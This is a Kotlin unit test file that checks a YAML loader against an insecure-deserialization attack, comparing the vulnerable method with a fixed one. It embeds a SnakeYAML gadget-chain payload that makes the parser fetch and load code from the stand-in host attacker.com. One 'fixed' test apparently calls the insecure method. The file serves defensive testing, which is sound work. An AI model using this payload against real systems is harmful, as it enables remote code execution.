package org.jetbrains.amper

import java.io.File
import java.io.FileWriter
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertTrue

class InsecureDeserializationTest {
    val insecureDeserialization = InsecureDeserialization()

    val safeYaml = """
            name: Test
            value: 42
            enabled: true
            list:
              - item1
              - item2
    """.trimIndent()

    val maliciousYaml = """
            !!javax.script.ScriptEngineManager [
              !!java.net.URLClassLoader [[
                !!java.net.URL ["http://attacker.com/"]
              ]]
    """.trimIndent()

    @Test
    fun loadDataFromSafeYamlTest() {
        val tempFile = createTempFile(safeYaml)
        val insecureResult = insecureDeserialization.loadDataFromYaml(tempFile.path)
        assertTrue(insecureResult.isPresent)
        assertEquals("Test", insecureResult.get()["name"] as String)
        tempFile.delete()
    }

    @Test
    fun fixedLoadDataFromSafeYamlTest() {
        val tempFile = createTempFile(safeYaml)
        val secureResult = insecureDeserialization.loadDataFromYaml(tempFile.path)
        assertTrue(secureResult.isPresent)
        assertEquals("Test", secureResult.get()["name"] as String)
        tempFile.delete()
    }

    @Test
    fun loadDataFromMaliciousYamlTest() {
        val tempFile = createTempFile(maliciousYaml)
        insecureDeserialization.loadDataFromYaml(tempFile.path)
        println(tempFile.absolutePath)
        tempFile.delete()
    }

    @Test
    fun fixedLoadDataFromMaliciousYamlTest() {
        val tempFile = createTempFile(maliciousYaml)
        val result = insecureDeserialization.fixedLoadDataFromYaml(tempFile.path)
        assertTrue(result.isEmpty)
        tempFile.delete()
    }

    private fun createTempFile(content: String): File {
        val tempFile = File.createTempFile("test", ".yaml")
        FileWriter(tempFile).use { it.write(content) }
        return tempFile
    }
}
